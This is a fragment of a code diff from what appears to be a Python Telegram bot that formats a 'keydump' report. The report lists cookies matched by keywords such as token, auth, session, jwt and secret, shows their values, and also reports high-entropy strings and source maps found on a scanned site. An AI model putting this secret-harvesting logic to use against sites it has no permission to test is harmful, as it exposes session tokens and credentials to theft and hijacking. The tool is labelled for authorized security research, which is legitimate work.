         interesting_cookies = [
             c for c in dyn.get("cookies", [])
             if any(k in c["name"].lower() for k in
-                   ["token","auth","session","key","jwt","access","secret","api"])
+                   ["token", "auth", "session", "key", "jwt", "access", "secret", "api"])
         ]
         if interesting_cookies:
             lines.append(f"🍪 *Auth Cookies* `({len(interesting_cookies)})`")
             for c in interesting_cookies[:5]:
-                lines.append(f"  `{c['name']}` = `{c['value'][:50]}`")
+                badge, _ = _kd_confidence("Token", c["value"])
+                lines.append(f"  {badge} `{c['name']}` = `{c['value'][:50]}`")
             lines.append("")
 
-        # High-entropy
+        # ── High-entropy strings ──────────────────────────────────────────────
         if entropy:
-            lines.append(f"🔬 *High-Entropy Strings* `(H>{4.5})` — `{len(entropy)}` found")
-            for item in entropy[:5]:
+            lines.append(f"🔬 *High-Entropy Strings* `(H≥4.2)` — `{len(entropy)}` found")
+            for item in entropy[:6]:
+                badge, _ = _kd_confidence("entropy", item["value"])
                 lines.append(
-                    f"  H=`{item['entropy']}` `{item['value'][:55]}`"
+                    f"  {badge} H=`{item['entropy']}` `{item['value'][:55]}`"
                 )
             lines.append("")
 
-        # Source maps
+        # ── Source maps ───────────────────────────────────────────────────────
         if smaps:
             lines.append(f"🗺 *Source Maps Found* `({len(smaps)})`")
             for sm in smaps[:3]:
                 lines.append(f"  `{sm[-60:]}`")
             lines.append("")
 
-    # Footer with action hint
     lines += [
         "━━━━━━━━━━━━━━━━━━━━",
         "⚠️ _For authorized/security research use only_",
@@ -16149,7 +16472,6 @@ def _format_keydump_report(result: dict) -> tuple:
     return "\n".join(lines), result
 
 
-# ── Inline keyboard for keydump actions ──────────────────────
 def _keydump_keyboard(uid: int) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([
         [
